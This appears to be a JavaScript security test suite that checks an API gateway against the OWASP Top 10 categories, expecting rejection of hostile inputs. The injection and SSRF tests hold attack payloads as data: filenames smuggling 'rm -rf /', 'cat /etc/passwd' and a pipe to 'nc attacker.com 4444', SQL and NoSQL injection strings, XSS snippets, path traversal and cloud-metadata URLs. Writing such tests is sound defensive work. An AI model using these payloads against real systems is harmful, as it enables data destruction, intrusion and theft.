const request = require('supertest');
const TestHelpers = require('../utils/test-helpers');

// Mock the API Gateway for security testing
const app = require('@/services/api-gateway/app');

describe('OWASP Top 10 Security Tests', () => {
  let server;
  let authToken;

  beforeAll(async () => {
    server = app.listen(0);
    authToken = 'Bearer test-api-key';
  });

  afterAll(async () => {
    await new Promise(resolve => server.close(resolve));
  });

  describe('A01: Broken Access Control', () => {
    it('should prevent unauthorized access to user data', async () => {
      // Try to access another user's data
      const response = await request(server)
        .get('/api/v1/users/999/profile')
        .set('Authorization', authToken)
        .expect(403);

      expect(response.body.error.code).toBe('FORBIDDEN');
    });

    it('should enforce proper authorization on admin endpoints', async () => {
      const response = await request(server)
        .get('/api/v1/admin/users')
        .set('Authorization', authToken)
        .expect(403);

      expect(response.body.error.code).toBe('INSUFFICIENT_PERMISSIONS');
    });

    it('should prevent path traversal attacks', async () => {
      const maliciousPath = '../../../etc/passwd';
      
      const response = await request(server)
        .get(`/api/v1/files/${encodeURIComponent(maliciousPath)}`)
        .set('Authorization', authToken)
        .expect(400);

      expect(response.body.error.code).toBe('INVALID_PATH');
    });

    it('should validate object references', async () => {
      // Try to access resources with manipulated IDs
      const manipulatedIds = [
        'project_999999',
        'project_-1',
        'project_null',
        'project_undefined',
        'project_../../admin'
      ];

      for (const id of manipulatedIds) {
        const response = await request(server)
          .get(`/api/v1/projects/${id}`)
          .set('Authorization', authToken)
          .expect(404);

        expect(response.body.error.code).toBe('NOT_FOUND');
      }
    });
  });

  describe('A02: Cryptographic Failures', () => {
    it('should use HTTPS in production', async () => {
      const response = await request(server)
        .get('/api/v1/config/security')
        .set('Authorization', authToken)
        .expect(200);

      expect(response.body.httpsRequired).toBe(true);
      expect(response.body.tlsVersion).toBe('1.2');
    });

    it('should properly hash sensitive data', async () => {
      const response = await request(server)
        .post('/api/v1/auth/register')
        .send({
          email: 'test@example.com',
          password: 'SecurePassword123!'
        })
        .expect(201);

      // Password should never be returned
      expect(response.body.data).not.toHaveProperty('password');
      expect(response.body.data).not.toHaveProperty('passwordHash');
    });

    it('should encrypt sensitive data at rest', async () => {
      const response = await request(server)
        .get('/api/v1/config/encryption')
        .set('Authorization', authToken)
        .expect(200);

      expect(response.body.dataEncryption).toBe('AES-256-GCM');
      expect(response.body.keyManagement).toBe('HSM');
    });
  });

  describe('A03: Injection', () => {
    it('should prevent SQL injection', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "1; SELECT * FROM users WHERE 't' = 't"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(server)
          .get(`/api/v1/search?q=${encodeURIComponent(payload)}`)
          .set('Authorization', authToken)
          .expect(200);

        // Should return empty results, not database errors
        expect(response.body.data).toEqual([]);
        expect(response.body.error).toBeUndefined();
      }
    });

    it('should prevent NoSQL injection', async () => {
      const noSqlPayloads = [
        { $ne: null },
        { $gt: '' },
        { $where: 'this.password == this.password' }
      ];

      for (const payload of noSqlPayloads) {
        const response = await request(server)
          .post('/api/v1/users/search')
          .set('Authorization', authToken)
          .send({ filter: payload })
          .expect(400);

        expect(response.body.error.code).toBe('INVALID_FILTER');
      }
    });

    it('should prevent command injection', async () => {
      const commandInjectionPayloads = [
        'test.png; rm -rf /',
        'test.png && cat /etc/passwd',
        'test.png | nc attacker.com 4444'
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(server)
          .post('/api/v1/images/process')
          .set('Authorization', authToken)
          .send({ filename: payload })
          .expect(400);

        expect(response.body.error.code).toBe('INVALID_FILENAME');
      }
    });

    it('should sanitize HTML to prevent XSS', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg/onload=alert(1)>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(server)
          .post('/api/v1/projects')
          .set('Authorization', authToken)
          .send({
            name: payload,
            description: payload
          })
          .expect(201);

        // Check that HTML is escaped
        expect(response.body.data.name).not.toContain('<script>');
        expect(response.body.data.name).not.toContain('javascript:');
        expect(response.body.data.description).not.toContain('onerror=');
      }
    });
  });

  describe('A04: Insecure Design', () => {
    it('should enforce business logic constraints', async () => {
      // Try to create more projects than allowed
      const maxProjects = 10;
      const promises = [];

      for (let i = 0; i < maxProjects + 5; i++) {
        promises.push(
          request(server)
            .post('/api/v1/projects')
            .set('Authorization', authToken)
            .send({ name: `Project ${i}` })
        );
      }

      const responses = await Promise.all(promises);
      const failures = responses.filter(r => r.status === 400);
      
      expect(failures.length).toBeGreaterThan(0);
      expect(failures[0].body.error.code).toBe('PROJECT_LIMIT_EXCEEDED');
    });

    it('should implement proper rate limiting', async () => {
      const requests = [];
      
      // Send many requests quickly
      for (let i = 0; i < 150; i++) {
        requests.push(
          request(server)
            .get('/api/v1/user/profile')
            .set('Authorization', authToken)
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);
      
      expect(rateLimited.length).toBeGreaterThan(0);
    });

    it('should validate business workflows', async () => {
      // Try to generate code without analysis
      const response = await request(server)
        .post('/api/v1/code/generate')
        .set('Authorization', authToken)
        .send({
          analysisId: 'nonexistent_analysis',
          framework: 'react'
        })
        .expect(400);

      expect(response.body.error.code).toBe('INVALID_WORKFLOW');
    });
  });

  describe('A05: Security Misconfiguration', () => {
    it('should not expose sensitive headers', async () => {
      const response = await request(server)
        .get('/health')
        .expect(200);

      // Check that sensitive headers are not exposed
      expect(response.headers['x-powered-by']).toBeUndefined();
      expect(response.headers['server']).toBeUndefined();
      expect(response.headers['x-aspnet-version']).toBeUndefined();
    });

    it('should have proper CORS configuration', async () => {
      const response = await request(server)
        .options('/api/v1/images/upload')
        .set('Origin', 'https://evil.com')
        .expect(204);

      // Should not allow arbitrary origins
      expect(response.headers['access-control-allow-origin']).not.toBe('https://evil.com');
      expect(response.headers['access-control-allow-origin']).not.toBe('*');
    });

    it('should not expose debug information in production', async () => {
      // Force an error
      const response = await request(server)
        .get('/api/v1/crash-test')
        .set('Authorization', authToken)
        .expect(500);

      // Should not expose stack traces
      expect(response.body.error).not.toHaveProperty('stack');
      expect(response.body.error).not.toHaveProperty('sql');
      expect(response.body.error.message).not.toContain('at Function');
    });

    it('should have secure cookie configuration', async () => {
      const response = await request(server)
        .post('/api/v1/auth/login')
        .send({
          email: 'test@example.com',
          password: 'password123'
        })
        .expect(200);

      const cookies = response.headers['set-cookie'];
      if (cookies) {
        cookies.forEach(cookie => {
          expect(cookie).toContain('Secure');
          expect(cookie).toContain('HttpOnly');
          expect(cookie).toContain('SameSite=Strict');
        });
      }
    });
  });

  describe('A06: Vulnerable and Outdated Components', () => {
    it('should check for vulnerable dependencies', async () => {
      const response = await request(server)
        .get('/api/v1/health/dependencies')
        .set('Authorization', authToken)
        .expect(200);

      expect(response.body.vulnerabilities).toEqual([]);
      expect(response.body.outdated).toEqual([]);
    });
  });

  describe('A07: Identification and Authentication Failures', () => {
    it('should enforce strong password requirements', async () => {
      const weakPasswords = [
        '123456',
        'password',
        'qwerty',
        'abc123',
        'password123'
      ];

      for (const password of weakPasswords) {
        const response = await request(server)
          .post('/api/v1/auth/register')
          .send({
            email: `test${Date.now()}@example.com`,
            password
          })
          .expect(400);

        expect(response.body.error.code).toBe('WEAK_PASSWORD');
      }
    });

    it('should implement account lockout after failed attempts', async () => {
      const email = 'lockout-test@example.com';
      const attempts = [];

      // Make multiple failed login attempts
      for (let i = 0; i < 6; i++) {
        attempts.push(
          request(server)
            .post('/api/v1/auth/login')
            .send({
              email,
              password: 'wrong-password'
            })
        );
      }

      const responses = await Promise.all(attempts);
      const lastResponse = responses[responses.length - 1];
      
      expect(lastResponse.status).toBe(429);
      expect(lastResponse.body.error.code).toBe('ACCOUNT_LOCKED');
    });

    it('should implement secure session management', async () => {
      // Login to get session
      const loginResponse = await request(server)
        .post('/api/v1/auth/login')
        .send({
          email: 'test@example.com',
          password: 'password123'
        })
        .expect(200);

      const sessionToken = loginResponse.body.data.token;

      // Verify session has proper attributes
      const sessionResponse = await request(server)
        .get('/api/v1/auth/session')
        .set('Authorization', `Bearer ${sessionToken}`)
        .expect(200);

      expect(sessionResponse.body.data).toHaveProperty('expiresAt');
      expect(sessionResponse.body.data).toHaveProperty('lastActivity');
      expect(sessionResponse.body.data).toHaveProperty('ipAddress');
    });
  });

  describe('A08: Software and Data Integrity Failures', () => {
    it('should verify file integrity on upload', async () => {
      const mockImage = await TestHelpers.createMockImage();
      const tamperedChecksum = 'invalid-checksum';

      const response = await request(server)
        .post('/api/v1/images/upload')
        .set('Authorization', authToken)
        .field('checksum', tamperedChecksum)
        .attach('image', mockImage.buffer, 'test.png')
        .expect(400);

      expect(response.body.error.code).toBe('INTEGRITY_CHECK_FAILED');
    });

    it('should validate webhook signatures', async () => {
      const webhookPayload = {
        event: 'analysis.completed',
        data: { analysisId: '123' }
      };

      // Send webhook without signature
      const response = await request(server)
        .post('/api/v1/webhooks/receive')
        .send(webhookPayload)
        .expect(401);

      expect(response.body.error.code).toBe('INVALID_SIGNATURE');
    });
  });

  describe('A09: Security Logging and Monitoring Failures', () => {
    it('should log security events', async () => {
      // Trigger a security event (failed login)
      await request(server)
        .post('/api/v1/auth/login')
        .send({
          email: 'nonexistent@example.com',
          password: 'wrong-password'
        })
        .expect(401);

      // Check that event was logged
      const logsResponse = await request(server)
        .get('/api/v1/admin/logs/security')
        .set('Authorization', authToken)
        .query({ event: 'failed_login' })
        .expect(200);

      expect(logsResponse.body.data.length).toBeGreaterThan(0);
      expect(logsResponse.body.data[0]).toHaveProperty('timestamp');
      expect(logsResponse.body.data[0]).toHaveProperty('ip');
      expect(logsResponse.body.data[0]).toHaveProperty('userAgent');
    });

    it('should detect and log anomalous behavior', async () => {
      // Simulate anomalous behavior (rapid requests from same IP)
      const requests = [];
      for (let i = 0; i < 100; i++) {
        requests.push(
          request(server)
            .get('/api/v1/projects')
            .set('Authorization', authToken)
            .set('X-Forwarded-For', '192.168.1.100')
        );
      }

      await Promise.all(requests);

      // Check anomaly detection logs
      const anomalyResponse = await request(server)
        .get('/api/v1/admin/logs/anomalies')
        .set('Authorization', authToken)
        .expect(200);

      expect(anomalyResponse.body.data.length).toBeGreaterThan(0);
      expect(anomalyResponse.body.data[0].type).toBe('RATE_ANOMALY');
    });
  });

  describe('A10: Server-Side Request Forgery (SSRF)', () => {
    it('should prevent SSRF attacks on image URLs', async () => {
      const ssrfPayloads = [
        'http://localhost:8080/admin',
        'http://127.0.0.1:22',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'gopher://localhost:3306'
      ];

      for (const payload of ssrfPayloads) {
        const response = await request(server)
          .post('/api/v1/images/import')
          .set('Authorization', authToken)
          .send({ url: payload })
          .expect(400);

        expect(response.body.error.code).toBe('INVALID_URL');
      }
    });

    it('should validate webhook URLs', async () => {
      const internalUrls = [
        'http://localhost/webhook',
        'http://10.0.0.1/webhook',
        'http://192.168.1.1/webhook'
      ];

      for (const url of internalUrls) {
        const response = await request(server)
          .post('/api/v1/webhooks/configure')
          .set('Authorization', authToken)
          .send({ url })
          .expect(400);

        expect(response.body.error.code).toBe('INVALID_WEBHOOK_URL');
      }
    });
  });

  describe('Additional Security Tests', () => {
    it('should implement proper input validation', async () => {
      const oversizedPayload = {
        name: 'a'.repeat(10000),
        description: 'b'.repeat(100000)
      };

      const response = await request(server)
        .post('/api/v1/projects')
        .set('Authorization', authToken)
        .send(oversizedPayload)
        .expect(400);

      expect(response.body.error.code).toBe('PAYLOAD_TOO_LARGE');
    });

    it('should prevent timing attacks on authentication', async () => {
      const timings = [];

      // Test with valid and invalid users
      const users = [
        { email: 'valid@example.com', exists: true },
        { email: 'invalid@example.com', exists: false }
      ];

      for (const user of users) {
        const start = process.hrtime.bigint();
        
        await request(server)
          .post('/api/v1/auth/login')
          .send({
            email: user.email,
            password: 'wrong-password'
          });
          
        const end = process.hrtime.bigint();
        const duration = Number(end - start) / 1e6; // Convert to ms
        
        timings.push({ exists: user.exists, duration });
      }

      // Response times should be similar to prevent user enumeration
      const validTiming = timings.find(t => t.exists).duration;
      const invalidTiming = timings.find(t => !t.exists).duration;
      const difference = Math.abs(validTiming - invalidTiming);
      
      expect(difference).toBeLessThan(50); // Less than 50ms difference
    });

    it('should implement Content Security Policy', async () => {
      const response = await request(server)
        .get('/')
        .expect(200);

      const csp = response.headers['content-security-policy'];
      expect(csp).toBeDefined();
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("script-src 'self'");
      expect(csp).toContain("style-src 'self'");
    });
  });
});